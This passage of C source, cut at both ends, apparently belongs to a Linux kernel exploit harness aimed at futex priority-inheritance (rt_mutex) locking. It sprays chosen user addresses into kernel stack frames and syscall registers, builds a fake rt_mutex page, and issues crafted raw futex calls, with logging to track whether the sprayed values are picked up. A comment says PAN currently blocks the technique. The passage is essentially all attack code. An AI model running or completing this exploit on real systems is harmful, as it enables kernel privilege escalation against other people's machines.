           stackshape_case_is("readlink") ||
           stackshape_case_is("readstatus") ||
           stackshape_case_is("unixdgram") ||
           stackshape_case_is("nanosleep") ||
           stackshape_case_is("gettid") ||
           stackshape_case_is("clock") ||
           stackshape_case_is("yield") ||
           stackshape_case_is("readlink-readstatus") ||
           stackshape_case_is("readstatus-unixdgram") ||
           stackshape_case_is("readlink-readstatus-unixdgram") ||
           stackshape_case_is("unix-nanosleep") ||
           stackshape_case_is("nanosleep8") ||
           stackshape_case_is("readstatus-nanosleep8") ||
           stackshape_case_is("unixdgram-nanosleep8") ||
           stackshape_case_is("readstatus-unixdgram-nanosleep8") ||
           stackshape_case_is("full-no-readlink") ||
           stackshape_case_is("full-no-tail") ||
           stackshape_case_is("full-no-nanosleep") ||
           stackshape_case_is("tag-readstatus") ||
           stackshape_case_is("tag-unixdgram") ||
           stackshape_case_is("tag-readstatus-nanosleep8") ||
           stackshape_case_is("tag-unixdgram-nanosleep8") ||
           stackshape_case_is("tag-readstatus-unixdgram-nanosleep8") ||
           stackshape_case_is("stacktag-full") ||
           stackshape_case_is("stacktag-readstatus") ||
           stackshape_case_is("stacktag-unixdgram") ||
           stackshape_case_is("stacktag-readstatus-unixdgram") ||
           stackshape_case_is("stacktag-readstatus-nanosleep8") ||
           stackshape_case_is("stacktag-unixdgram-nanosleep8") ||
           stackshape_case_is("stacktag-readstatus-unixdgram-nanosleep8");
}

static void stackshape_prepare_tag_page(uint8_t *tag, uintptr_t tag_value,
                                        long iter)
{
    uint8_t fill = (uint8_t)(0x54 ^ (iter & 0x0f));
    uint64_t zero64 = 0;
    uint32_t zero32 = 0;

    memset(tag, fill, SLOTSEARCH_PAGE_SIZE);

    /*
     * Keep the page usable as a harmless fake rt_mutex candidate if a later
     * run proves this address is selected. Current kernels still fault under
     * PAN before consuming these bytes.
     */
    memcpy(tag + 0x00, &zero32, sizeof(zero32));
    memcpy(tag + 0x08, &zero64, sizeof(zero64));
    memcpy(tag + 0x10, &zero64, sizeof(zero64));
    memcpy(tag + 0x18, &zero64, sizeof(zero64));

    for (size_t off = 0x38; off < 0x180; off += sizeof(tag_value)) {
        memcpy(tag + off, &tag_value, sizeof(tag_value));
    }
}

static int waiter_churn_stack_syscalls_plain(long iter)
{
    char buf[768];
    char msgbuf[96];
    volatile uint64_t marker[32];
    int failures = 0;
    int full = stackshape_case_is("full");
    int full_no_readlink = stackshape_case_is("full-no-readlink");
    int full_no_tail = stackshape_case_is("full-no-tail");
    int full_no_nanosleep = stackshape_case_is("full-no-nanosleep");
    int readstatus_unixdgram = stackshape_case_is("readstatus-unixdgram");
    int readlink_readstatus_unixdgram =
        stackshape_case_is("readlink-readstatus-unixdgram");
    int readstatus_nanosleep8 = stackshape_case_is("readstatus-nanosleep8");
    int unixdgram_nanosleep8 = stackshape_case_is("unixdgram-nanosleep8");
    int readstatus_unixdgram_nanosleep8 =
        stackshape_case_is("readstatus-unixdgram-nanosleep8");
    int do_readlink = full ||
                      stackshape_case_is("readlink") ||
                      stackshape_case_is("readlink-readstatus") ||
                      readlink_readstatus_unixdgram ||
                      full_no_tail ||
                      full_no_nanosleep;
    int do_readstatus = full ||
                        full_no_readlink ||
                        full_no_tail ||
                        full_no_nanosleep ||
                        stackshape_case_is("readstatus") ||
                        stackshape_case_is("readlink-readstatus") ||
                        readstatus_unixdgram ||
                        readlink_readstatus_unixdgram ||
                        readstatus_nanosleep8 ||
                        readstatus_unixdgram_nanosleep8;
    int do_unixdgram = full ||
                       full_no_readlink ||
                       full_no_tail ||
                       full_no_nanosleep ||
                       stackshape_case_is("unixdgram") ||
                       stackshape_case_is("unix-nanosleep") ||
                       readstatus_unixdgram ||
                       readlink_readstatus_unixdgram ||
                       unixdgram_nanosleep8 ||
                       readstatus_unixdgram_nanosleep8;
    int do_nanosleep = stackshape_case_is("nanosleep") ||
                       stackshape_case_is("unix-nanosleep") ||
                       ((full ||
                         full_no_readlink ||
                         full_no_tail ||
                         stackshape_case_is("nanosleep8") ||
                         readstatus_nanosleep8 ||
                         unixdgram_nanosleep8 ||
                         readstatus_unixdgram_nanosleep8) &&
                        ((iter & 7) == 0));
    int do_gettid = full ||
                    full_no_readlink ||
                    full_no_nanosleep ||
                    stackshape_case_is("gettid");
    int do_clock = full ||
                   full_no_readlink ||
                   full_no_nanosleep ||
                   stackshape_case_is("clock");
    int do_yield = full ||
                   full_no_readlink ||
                   full_no_nanosleep ||
                   stackshape_case_is("yield");

    for (size_t i = 0; i < sizeof(marker) / sizeof(marker[0]); i++) {
        marker[i] = 0x4349564553544b00ULL ^ (uint64_t)iter ^ i;
    }
    memset(buf, 0, sizeof(buf));
    memset(msgbuf, (int)(0x41 + (iter & 0x0f)), sizeof(msgbuf));

    if (stack_marker_telemetry_should_log(iter)) {
        print_stack_marker_telemetry("pre", iter, marker, buf, msgbuf,
                                     &failures);
    }

    if (do_readlink && readlink("/proc/self/exe", buf, sizeof(buf) - 1) < 0) {
        failures++;
    }

    if (do_readstatus) {
        int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
        if (fd >= 0) {
            if (read(fd, buf, sizeof(buf)) < 0) {
                failures++;
            }
            close(fd);
        } else {
            failures++;
        }
    }

    if (do_unixdgram) {
        int sp[2] = {-1, -1};
        if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0, sp) == 0) {
            struct iovec iov = {
                .iov_base = msgbuf,
                .iov_len = sizeof(msgbuf),
            };
            struct msghdr msg;
            memset(&msg, 0, sizeof(msg));
            msg.msg_iov = &iov;
            msg.msg_iovlen = 1;

            if (sendmsg(sp[0], &msg, 0) < 0) {
                failures++;
            }
            memset(msgbuf, 0, sizeof(msgbuf));
            if (recvmsg(sp[1], &msg, 0) < 0) {
                failures++;
            }
            close(sp[0]);
            close(sp[1]);
        } else {
            failures++;
        }
    }

    if (do_nanosleep) {
        struct timespec ts = {
            .tv_sec = 0,
            .tv_nsec = 1000,
        };
        if (nanosleep(&ts, NULL) != 0 && errno != EINTR) {
            failures++;
        }
    }

    if (do_gettid) {
        (void)syscall(SYS_gettid);
    }
    if (do_clock) {
        (void)clock_gettime(CLOCK_MONOTONIC, &(struct timespec){0});
    }
    if (do_yield) {
        sched_yield();
    }

    if (stack_marker_telemetry_should_log(iter)) {
        print_stack_marker_telemetry("post", iter, marker, buf, msgbuf,
                                     &failures);
    }

    return failures == 0 ? 0 : -1;
}

static int waiter_churn_stack_syscalls_tagged(long iter)
{
    char buf[768];
    char msgbuf[96];
    volatile uint64_t marker[32];
    volatile uintptr_t tag_spray[32];
    uint8_t mincore_vec[1] = {0};
    uint8_t *tag = NULL;
    uintptr_t tag_value = 0;
    uintptr_t spray_value = 0;
    int tagged = stackshape_case_is_tagged();
    int stacktag = stackshape_case_is_stacktag();
    int tag_like = tagged || stacktag;
    int failures = 0;
    int full = stackshape_case_is("full");
    int full_no_readlink = stackshape_case_is("full-no-readlink");
    int full_no_tail = stackshape_case_is("full-no-tail");
    int full_no_nanosleep = stackshape_case_is("full-no-nanosleep");
    int readstatus_unixdgram = stackshape_case_is("readstatus-unixdgram");
    int readlink_readstatus_unixdgram =
        stackshape_case_is("readlink-readstatus-unixdgram");
    int readstatus_nanosleep8 = stackshape_case_is("readstatus-nanosleep8");
    int unixdgram_nanosleep8 = stackshape_case_is("unixdgram-nanosleep8");
    int readstatus_unixdgram_nanosleep8 =
        stackshape_case_is("readstatus-unixdgram-nanosleep8");
    int tag_readstatus = stackshape_case_is("tag-readstatus") ||
                         stackshape_case_is("tag-readstatus-nanosleep8") ||
                         stackshape_case_is("tag-readstatus-unixdgram-nanosleep8");
    int tag_unixdgram = stackshape_case_is("tag-unixdgram") ||
                        stackshape_case_is("tag-unixdgram-nanosleep8") ||
                        stackshape_case_is("tag-readstatus-unixdgram-nanosleep8");
    int tag_nanosleep8 = stackshape_case_is("tag-readstatus-nanosleep8") ||
                         stackshape_case_is("tag-unixdgram-nanosleep8") ||
                         stackshape_case_is("tag-readstatus-unixdgram-nanosleep8");
    int stacktag_full = stackshape_case_is("stacktag-full");
    int stacktag_readstatus =
        stackshape_case_is("stacktag-readstatus") ||
        stackshape_case_is("stacktag-readstatus-unixdgram") ||
        stackshape_case_is("stacktag-readstatus-nanosleep8") ||
        stackshape_case_is("stacktag-readstatus-unixdgram-nanosleep8");
    int stacktag_unixdgram =
        stackshape_case_is("stacktag-unixdgram") ||
        stackshape_case_is("stacktag-readstatus-unixdgram") ||
        stackshape_case_is("stacktag-unixdgram-nanosleep8") ||
        stackshape_case_is("stacktag-readstatus-unixdgram-nanosleep8");
    int stacktag_nanosleep8 =
        stackshape_case_is("stacktag-readstatus-nanosleep8") ||
        stackshape_case_is("stacktag-unixdgram-nanosleep8") ||
        stackshape_case_is("stacktag-readstatus-unixdgram-nanosleep8");
    int do_readlink = full ||
                      stacktag_full ||
                      stackshape_case_is("readlink") ||
                      stackshape_case_is("readlink-readstatus") ||
                      readlink_readstatus_unixdgram ||
                      full_no_tail ||
                      full_no_nanosleep;
    int do_readstatus = full ||
                        stacktag_full ||
                        full_no_readlink ||
                        full_no_tail ||
                        full_no_nanosleep ||
                        stackshape_case_is("readstatus") ||
                        stackshape_case_is("readlink-readstatus") ||
                        readstatus_unixdgram ||
                        readlink_readstatus_unixdgram ||
                        readstatus_nanosleep8 ||
                        readstatus_unixdgram_nanosleep8 ||
                        tag_readstatus ||
                        stacktag_readstatus;
    int do_unixdgram = full ||
                       stacktag_full ||
                       full_no_readlink ||
                       full_no_tail ||
                       full_no_nanosleep ||
                       stackshape_case_is("unixdgram") ||
                       stackshape_case_is("unix-nanosleep") ||
                       readstatus_unixdgram ||
                       readlink_readstatus_unixdgram ||
                       unixdgram_nanosleep8 ||
                       readstatus_unixdgram_nanosleep8 ||
                       tag_unixdgram ||
                       stacktag_unixdgram;
    int do_nanosleep = stackshape_case_is("nanosleep") ||
                       stackshape_case_is("unix-nanosleep") ||
                       ((full ||
                         stacktag_full ||
                         full_no_readlink ||
                         full_no_tail ||
                         stackshape_case_is("nanosleep8") ||
                         readstatus_nanosleep8 ||
                         unixdgram_nanosleep8 ||
                         readstatus_unixdgram_nanosleep8 ||
                         tag_nanosleep8 ||
                         stacktag_nanosleep8) &&
                        ((iter & 7) == 0));
    int do_gettid = full ||
                    stacktag_full ||
                    full_no_readlink ||
                    full_no_nanosleep ||
                    stackshape_case_is("gettid");
    int do_clock = full ||
                   stacktag_full ||
                   full_no_readlink ||
                   full_no_nanosleep ||
                   stackshape_case_is("clock");
    int do_yield = full ||
                   stacktag_full ||
                   full_no_readlink ||
                   full_no_nanosleep ||
                   stackshape_case_is("yield");

    for (size_t i = 0; i < sizeof(marker) / sizeof(marker[0]); i++) {
        marker[i] = 0x4349564553544b00ULL ^ (uint64_t)iter ^ i;
    }
    for (size_t i = 0; i < sizeof(tag_spray) / sizeof(tag_spray[0]); i++) {
        tag_spray[i] = 0;
    }
    memset(buf, 0, sizeof(buf));
    memset(msgbuf, (int)(0x41 + (iter & 0x0f)), sizeof(msgbuf));

    if (tag_like) {
        if (slotsearch_init_region() != 0) {
            failures++;
        } else {
            tag = (uint8_t *)slotsearch_region +
                  ((iter % SLOTSEARCH_PAGES) * SLOTSEARCH_PAGE_SIZE);
            tag_value = (uintptr_t)tag;
            spray_value = stacktag && stacktag_value != 0 ?
                          (uintptr_t)stacktag_value : tag_value;
            stackshape_prepare_tag_page(tag, tag_value, iter);
            for (size_t i = 0;
                 i < sizeof(tag_spray) / sizeof(tag_spray[0]); i++) {
                tag_spray[i] = spray_value;
            }
            if (mprotect(tag, SLOTSEARCH_PAGE_SIZE,
                         PROT_READ | PROT_WRITE) != 0) {
                failures++;
            }
            if (madvise(tag, SLOTSEARCH_PAGE_SIZE, MADV_NORMAL) != 0) {
                failures++;
            }
            if (mincore(tag, SLOTSEARCH_PAGE_SIZE, mincore_vec) != 0) {
                failures++;
            }
        }
    }

    if (stacktag && tag != NULL) {
        for (size_t i = 0; i < sizeof(marker) / sizeof(marker[0]); i++) {
            marker[i] = spray_value;
        }
    }

    if (tag_like && slotsearch_should_log(iter)) {
        uintptr_t tag38 = 0;
        if (tag != NULL) {
            memcpy(&tag38, tag + 0x38, sizeof(tag38));
        }
        printf("[W] stackshape_tag pre iter=%ld tid=%ld case=%s tag=%p tag_value=0x%016llx tag38=0x%016llx marker0=0x%016llx marker31=0x%016llx spray0=0x%016llx spray31=0x%016llx mincore_vec=%p vec0=0x%02x failures_addr=%p failures=%d\n",
               iter, gettid_long(), stackshape_case, tag,
               (unsigned long long)tag_value,
               (unsigned long long)tag38,
               (unsigned long long)marker[0],
               (unsigned long long)marker[31],
               (unsigned long long)tag_spray[0],
               (unsigned long long)tag_spray[31],
               mincore_vec, mincore_vec[0], &failures, failures);
        fflush(stdout);
    }

    if (stack_marker_telemetry_should_log(iter)) {
        print_stack_marker_telemetry("pre", iter, marker, buf, msgbuf,
                                     &failures);
    }

    if (do_readlink && readlink("/proc/self/exe", buf, sizeof(buf) - 1) < 0) {
        failures++;
    }

    if (do_readstatus) {
        int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
        if (fd >= 0) {
            void *read_buf = (tagged && tag_readstatus && tag != NULL) ?
                             (void *)tag : (void *)buf;
            size_t read_len = (tagged && tag_readstatus && tag != NULL) ?
                              512 : sizeof(buf);
            if (read(fd, read_buf, read_len) < 0) {
                failures++;
            }
            close(fd);
        } else {
            failures++;
        }
    }

    if (do_unixdgram) {
        int sp[2] = {-1, -1};
        if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0, sp) == 0) {
            if (tagged && tag_unixdgram && tag != NULL) {
                stackshape_prepare_tag_page(tag, tag_value, iter);
            }
            struct iovec iov = {
                .iov_base = (tagged && tag_unixdgram && tag != NULL) ?
                            (void *)tag : (void *)msgbuf,
                .iov_len = (tagged && tag_unixdgram && tag != NULL) ?
                           96 : sizeof(msgbuf),
            };
            struct msghdr msg;
            memset(&msg, 0, sizeof(msg));
            msg.msg_iov = &iov;
            msg.msg_iovlen = 1;

            if (sendmsg(sp[0], &msg, 0) < 0) {
                failures++;
            }
            memset(msgbuf, 0, sizeof(msgbuf));
            if (recvmsg(sp[1], &msg, 0) < 0) {
                failures++;
            }
            close(sp[0]);
            close(sp[1]);
        } else {
            failures++;
        }
    }

    if (do_nanosleep) {
        struct timespec ts = {
            .tv_sec = 0,
            .tv_nsec = 1000,
        };
        if (nanosleep(&ts, NULL) != 0 && errno != EINTR) {
            failures++;
        }
    }

    if (do_gettid) {
        (void)syscall(SYS_gettid);
    }
    if (do_clock) {
        (void)clock_gettime(CLOCK_MONOTONIC, &(struct timespec){0});
    }
    if (do_yield) {
        sched_yield();
    }

    if (stack_marker_telemetry_should_log(iter)) {
        print_stack_marker_telemetry("post", iter, marker, buf, msgbuf,
                                     &failures);
    }

    if (tag_like && slotsearch_should_log(iter)) {
        uintptr_t tag38 = 0;
        if (tag != NULL) {
            memcpy(&tag38, tag + 0x38, sizeof(tag38));
        }
        printf("[W] stackshape_tag post iter=%ld tid=%ld case=%s tag=%p tag_value=0x%016llx tag38=0x%016llx marker0=0x%016llx marker31=0x%016llx failures=%d\n",
               iter, gettid_long(), stackshape_case, tag,
               (unsigned long long)tag_value,
               (unsigned long long)tag38,
               (unsigned long long)marker[0],
               (unsigned long long)marker[31],
               failures);
        fflush(stdout);
    }

    asm volatile("" : : "r"(tag_spray), "r"(tag), "r"(mincore_vec) : "memory");

    return failures == 0 ? 0 : -1;
}

static int waiter_churn_stack_syscalls(long iter)
{
    if (stackshape_case_is_tagged() || stackshape_case_is_stacktag()) {
        return waiter_churn_stack_syscalls_tagged(iter);
    }
    return waiter_churn_stack_syscalls_plain(iter);
}

static int waiter_churn_regspray_syscalls(long iter)
{
    volatile uint64_t keep[32];
    uint64_t base = regspray_value ^ ((uint64_t)iter << 12);
    uint64_t a0 = base;
    uint64_t a1 = base ^ 0x1111111111111111ULL;
    uint64_t a2 = base ^ 0x2222222222222222ULL;
    uint64_t a3 = base ^ 0x3333333333333333ULL;
    uint64_t a4 = base ^ 0x4444444444444444ULL;
    uint64_t a5 = base ^ 0x5555555555555555ULL;
    long ret0;
    long ret1;
    long ret2;

    for (size_t i = 0; i < sizeof(keep) / sizeof(keep[0]); i++) {
        keep[i] = base ^ (i * 0x0101010101010101ULL);
    }

    if (!quiet_waiter_churn && slotsearch_should_log(iter)) {
        printf("[W] regspray pre iter=%ld tid=%ld base=0x%016llx a0=0x%016llx a1=0x%016llx a2=0x%016llx a3=0x%016llx a4=0x%016llx a5=0x%016llx keep=%p keep0=0x%016llx keep31=0x%016llx\n",
               iter, gettid_long(), (unsigned long long)base,
               (unsigned long long)a0, (unsigned long long)a1,
               (unsigned long long)a2, (unsigned long long)a3,
               (unsigned long long)a4, (unsigned long long)a5,
               (void *)keep, (unsigned long long)keep[0],
               (unsigned long long)keep[31]);
        fflush(stdout);
    }

    for (int i = 0; i < 64; i++) {
        uint64_t salt = (uint64_t)i << 32;
        ret0 = raw_syscall6(SYS_getpid,
                            a0 ^ salt, a1 ^ salt, a2 ^ salt,
                            a3 ^ salt, a4 ^ salt, a5 ^ salt);
        ret1 = raw_syscall6(SYS_gettid,
                            a5 ^ salt, a4 ^ salt, a3 ^ salt,
                            a2 ^ salt, a1 ^ salt, a0 ^ salt);
        ret2 = raw_syscall6(SYS_getppid,
                            base ^ salt,
                            regspray_value,
                            0x000000007fff0000ULL,
                            a3 ^ salt,
                            a4 ^ salt,
                            a5 ^ salt);
        asm volatile("" : : "r"(ret0), "r"(ret1), "r"(ret2), "r"(keep) : "memory");
    }

    if (!quiet_waiter_churn && slotsearch_should_log(iter)) {
        printf("[W] regspray post iter=%ld tid=%ld base=0x%016llx ret0=%ld ret1=%ld ret2=%ld keep0=0x%016llx keep31=0x%016llx\n",
               iter, gettid_long(), (unsigned long long)base,
               ret0, ret1, ret2,
               (unsigned long long)keep[0],
               (unsigned long long)keep[31]);
        fflush(stdout);
    }

    return 0;
}

static int waiter_churn_regspray_clean_syscalls(long iter)
{
    volatile uint64_t keep[32];
    uint64_t base = regspray_value ^ ((uint64_t)iter << 12);
    uint64_t a0 = base;
    uint64_t a1 = base ^ 0x0101010101010101ULL;
    uint64_t a2 = base ^ 0x0202020202020202ULL;
    uint64_t a3 = base ^ 0x0303030303030303ULL;
    uint64_t a4 = base ^ 0x0404040404040404ULL;
    uint64_t a5 = base ^ 0x0505050505050505ULL;
    long ret0 = 0;
    long ret1 = 0;
    long ret2 = 0;

    for (size_t i = 0; i < sizeof(keep) / sizeof(keep[0]); i++) {
        keep[i] = base ^ (i * 0x1111111111111111ULL);
    }

    if (!quiet_waiter_churn && slotsearch_should_log(iter)) {
        printf("[W] regsprayclean pre iter=%ld tid=%ld base=0x%016llx a0=0x%016llx a1=0x%016llx a2=0x%016llx a3=0x%016llx a4=0x%016llx a5=0x%016llx keep=%p keep0=0x%016llx keep31=0x%016llx\n",
               iter, gettid_long(), (unsigned long long)base,
               (unsigned long long)a0, (unsigned long long)a1,
               (unsigned long long)a2, (unsigned long long)a3,
               (unsigned long long)a4, (unsigned long long)a5,
               (void *)keep, (unsigned long long)keep[0],
               (unsigned long long)keep[31]);
        fflush(stdout);
    }

    for (int i = 0; i < 128; i++) {
        uint64_t salt = (uint64_t)i << 32;
        ret0 = raw_syscall6(SYS_getpid,
                            a0 ^ salt, a1 ^ salt, a2 ^ salt,
                            a3 ^ salt, a4 ^ salt, a5 ^ salt);
        ret1 = raw_syscall6(SYS_gettid,
                            a5 ^ salt, a4 ^ salt, a3 ^ salt,
                            a2 ^ salt, a1 ^ salt, a0 ^ salt);
        ret2 = raw_syscall6(SYS_getppid,
                            base ^ salt, base ^ salt, base ^ salt,
                            base ^ salt, base ^ salt, base ^ salt);
        asm volatile("" : : "r"(ret0), "r"(ret1), "r"(ret2), "r"(keep) : "memory");
    }

    if (!quiet_waiter_churn && slotsearch_should_log(iter)) {
        printf("[W] regsprayclean post iter=%ld tid=%ld base=0x%016llx ret0=%ld ret1=%ld ret2=%ld keep0=0x%016llx keep31=0x%016llx\n",
               iter, gettid_long(), (unsigned long long)base,
               ret0, ret1, ret2,
               (unsigned long long)keep[0],
               (unsigned long long)keep[31]);
        fflush(stdout);
    }

    return 0;
}

static int slotsearch_init_region(void)
{
    if (slotsearch_region) {
        return 0;
    }

    slotsearch_region_len = SLOTSEARCH_PAGES * SLOTSEARCH_PAGE_SIZE;
    slotsearch_region = mmap(NULL, slotsearch_region_len,
                             PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (slotsearch_region == MAP_FAILED) {
        printf("[W] slotsearch mmap failed errno=%d (%s)\n",
               errno, strerror(errno));
        slotsearch_region = NULL;
        slotsearch_region_len = 0;
        fflush(stdout);
        return -1;
    }

    printf("[W] slotsearch region base=%p len=%zu pages=%d page_size=%d\n",
           slotsearch_region, slotsearch_region_len,
           SLOTSEARCH_PAGES, SLOTSEARCH_PAGE_SIZE);
    fflush(stdout);
    return 0;
}

static int slotsearch_should_log(long iter)
{
    if (iter < 2) {
        return 1;
    }
    return waiter_churn_iterations > 0 && iter + 1 == waiter_churn_iterations;
}

static long main_chainwalk_lock_pi(int *err_out, const char *label)
{
    if (!chainwalk_raw_final) {
        long ret = xfutex(cycle_futex_ptr(), F_LOCK_PI, 0, NULL, NULL, 0);
        *err_out = errno;
        return ret;
    }

    if (slotsearch_init_region() != 0) {
        *err_out = errno;
        return -1;
    }

    uint8_t *tag = (uint8_t *)slotsearch_region +
                   ((SLOTSEARCH_PAGES - 1) * SLOTSEARCH_PAGE_SIZE);
    struct timespec *utime = (struct timespec *)(void *)(tag + 0x40);
    uint32_t *uaddr2 = (uint32_t *)(void *)(tag + 0x80);
    uint64_t val3 = chainwalk_raw_val3 ? chainwalk_raw_val3 : regspray_value;
    uint64_t utime_arg = 0;
    struct timespec now;

    memset(tag, 0x4d, SLOTSEARCH_PAGE_SIZE);
    *(uint32_t *)tag = 0;
    *uaddr2 = 0x43485632U;
    utime->tv_sec = 0;
    utime->tv_nsec = 0;
    if (chainwalk_raw_timeout_ms > 0) {
        if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) {
            *err_out = errno;
            return -1;
        }
        *utime = now;
        utime->tv_sec += chainwalk_raw_timeout_ms / 1000;
        utime->tv_nsec += (chainwalk_raw_timeout_ms % 1000) * 1000000L;
        if (utime->tv_nsec >= 1000000000L) {
            utime->tv_sec++;
            utime->tv_nsec -= 1000000000L;
        }
        utime_arg = (uint64_t)(uintptr_t)utime;
    }

    if (!quiet_final) {
        printf("[M] %s raw-final args arg0_uaddr=%p arg1_op=0x%x arg2_val=0x%x arg3_utime=%p arg4_uaddr2=%p arg5_val3=0x%016llx utime_sec=%ld utime_nsec=%ld tag=%p tag0=0x%08x uaddr2_word=0x%08x\n",
               label, (void *)cycle_futex_ptr(), F_LOCK_PI, 0,
               (void *)(uintptr_t)utime_arg,
               (void *)uaddr2, (unsigned long long)val3,
               (long)utime->tv_sec, utime->tv_nsec, tag,
               *(uint32_t *)tag, *uaddr2);
        fflush(stdout);
    }

    long raw_ret = raw_syscall6(SYS_futex,
                                (uint64_t)(uintptr_t)cycle_futex_ptr(),
                                (uint64_t)F_LOCK_PI,
                                0,
                                utime_arg,
                                (uint64_t)(uintptr_t)uaddr2,
                                val3);
    if (raw_ret < 0 && raw_ret >= -4095) {
        *err_out = (int)-raw_ret;
        errno = *err_out;
        return -1;
    }
    *err_out = 0;
    errno = 0;
    return raw_ret;
}

static int main_final_shape_is(const char *name)
{
    return strcmp(main_final_shape, name) == 0;
}

static int main_final_shape_valid(void)
{
    return main_final_shape_is("none") ||
           main_final_shape_is("raw-getpid") ||
           main_final_shape_is("raw-futexwake") ||
           main_final_shape_is("raw-futexwait-eagain");
}

static int main_final_shape_syscall(const char *label)
{
    volatile uintptr_t spray[32];
    uint8_t *tag;
    uint32_t *uaddr;
    struct timespec *timeout;
    uint32_t *uaddr2;
    uint64_t marker;
    long nr;
    uint64_t a0;
    uint64_t a1;
    uint64_t a2;
    uint64_t a3;
    uint64_t a4;
    uint64_t a5;
    long raw_ret = 0;

    if (main_final_shape_is("none")) {
        return 0;
    }

    if (slotsearch_init_region() != 0) {
        return -1;
    }

    tag = (uint8_t *)slotsearch_region +
          ((SLOTSEARCH_PAGES - 1) * SLOTSEARCH_PAGE_SIZE);
    uaddr = (uint32_t *)(void *)tag;
    timeout = (struct timespec *)(void *)(tag + 0x40);
    uaddr2 = (uint32_t *)(void *)(tag + 0x80);
    marker = regspray_value ? regspray_value : 0x0000000051510000ULL;

    memset(tag, 0x53, SLOTSEARCH_PAGE_SIZE);
    *uaddr = 0;
    timeout->tv_sec = 0;
    timeout->tv_nsec = 1000;
    *uaddr2 = 0x4d465348U;
    for (size_t i = 0; i < sizeof(spray) / sizeof(spray[0]); i++) {
        spray[i] = (uintptr_t)tag;
    }

    if (main_final_shape_is("raw-getpid")) {
        nr = SYS_getpid;
        a0 = (uint64_t)(uintptr_t)tag;
        a1 = marker;
        a2 = marker ^ 0x11111111ULL;
        a3 = (uint64_t)(uintptr_t)timeout;
        a4 = (uint64_t)(uintptr_t)uaddr2;
        a5 = marker ^ 0x22222222ULL;
    } else if (main_final_shape_is("raw-futexwake")) {
        nr = SYS_futex;
        a0 = (uint64_t)(uintptr_t)uaddr;
        a1 = (uint64_t)F_WAKE;
        a2 = 1;
        a3 = (uint64_t)(uintptr_t)timeout;
        a4 = (uint64_t)(uintptr_t)uaddr2;
        a5 = marker;
    } else if (main_final_shape_is("raw-futexwait-eagain")) {
        nr = SYS_futex;
        a0 = (uint64_t)(uintptr_t)uaddr;
        a1 = (uint64_t)F_WAIT;
        a2 = 1;
        a3 = (uint64_t)(uintptr_t)timeout;
        a4 = (uint64_t)(uintptr_t)uaddr2;
        a5 = marker;
    } else {
        errno = EINVAL;
        return -1;
    }

    printf("[M] %s main-final-shape case=%s nr=%ld tag=%p marker=0x%016llx a0=0x%016llx a1=0x%016llx a2=0x%016llx a3=0x%016llx a4=0x%016llx a5=0x%016llx quiet_final=%d\n",
           label, main_final_shape, nr, tag, (unsigned long long)marker,
           (unsigned long long)a0, (unsigned long long)a1,
           (unsigned long long)a2, (unsigned long long)a3,
           (unsigned long long)a4, (unsigned long long)a5,
           quiet_final);
    fflush(stdout);

    raw_ret = raw_syscall6(nr, a0, a1, a2, a3, a4, a5);

    asm volatile("" : : "r"(spray), "r"(tag), "r"(raw_ret) : "memory");
    if (!quiet_final) {
        int raw_err = 0;
        if (raw_ret < 0 && raw_ret >= -4095) {
            raw_err = (int)-raw_ret;
        }
        printf("[M] %s main-final-shape ret=%ld raw_errno=%d (%s)\n",
               label, raw_ret, raw_err, raw_err ? strerror(raw_err) : "OK");
        fflush(stdout);
    }
    return 0;
}

static int waiter_churn_slotsearch_syscalls(long iter)
{
    volatile uintptr_t spray[64];
    uint8_t mincore_vec[1] = {0};
    int failures = 0;

    if (slotsearch_init_region() != 0) {
        return -1;
    }

    uint8_t *tag = (uint8_t *)slotsearch_region +
                   ((iter % SLOTSEARCH_PAGES) * SLOTSEARCH_PAGE_SIZE);
    uintptr_t tag_value = (uintptr_t)tag;

    for (size_t i = 0; i < sizeof(spray) / sizeof(spray[0]); i++) {
        spray[i] = tag_value;
    }

    memset(tag, 0x53, SLOTSEARCH_PAGE_SIZE);
    memcpy(tag + 128, &tag_value, sizeof(tag_value));

    if (mprotect(tag, SLOTSEARCH_PAGE_SIZE, PROT_READ | PROT_WRITE) != 0) {
        failures++;
    }
    if (madvise(tag, SLOTSEARCH_PAGE_SIZE, MADV_NORMAL) != 0) {
        failures++;
    }
    if (mincore(tag, SLOTSEARCH_PAGE_SIZE, mincore_vec) != 0) {
        failures++;
    }

    if (readlink("/proc/self/exe", (char *)tag, 96) < 0) {
        failures++;
    }

    struct timespec *ts = (struct timespec *)tag;
    ts->tv_sec = 0;
    ts->tv_nsec = 1000;
    if (clock_gettime(CLOCK_MONOTONIC, ts) != 0) {
        failures++;
    }
    ts->tv_sec = 0;
    ts->tv_nsec = 1000;
    if (nanosleep(ts, NULL) != 0 && errno != EINTR) {
        failures++;
    }

    (void)xfutex((uint32_t *)tag, F_WAKE, 1, NULL, NULL, 0);

    int sp[2] = {-1, -1};
    if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0, sp) == 0) {
        struct iovec iov[8];
        for (size_t i = 0; i < sizeof(iov) / sizeof(iov[0]); i++) {
            iov[i].iov_base = tag;
            iov[i].iov_len = 32;
        }
        struct msghdr msg;
        memset(&msg, 0, sizeof(msg));
        msg.msg_iov = iov;
        msg.msg_iovlen = sizeof(iov) / sizeof(iov[0]);
        if (sendmsg(sp[0], &msg, 0) < 0) {
            failures++;
        }
        if (recvmsg(sp[1], &msg, 0) < 0) {
            failures++;
        }
        close(sp[0]);
        close(sp[1]);
    } else {
        failures++;
    }

    asm volatile("" : : "r"(spray), "r"(tag), "r"(mincore_vec) : "memory");

    if (slotsearch_should_log(iter)) {
        printf("[W] slotsearch iter=%ld tid=%ld tag=%p tag_value=0x%016llx spray0=0x%016llx spray63=0x%016llx mincore_vec=%p vec0=0x%02x failures_addr=%p failures=%d\n",
               iter, gettid_long(), tag, (unsigned long long)tag_value,
               (unsigned long long)spray[0],
               (unsigned long long)spray[63],
               mincore_vec, mincore_vec[0], &failures, failures);
        fflush(stdout);
    }

    return failures == 0 ? 0 : -1;
}

static int waiter_churn_slotsearchlast_syscall(long iter)
{
    volatile uintptr_t spray[64];
    uint8_t mincore_vec[1] = {0};
    int failures = 0;

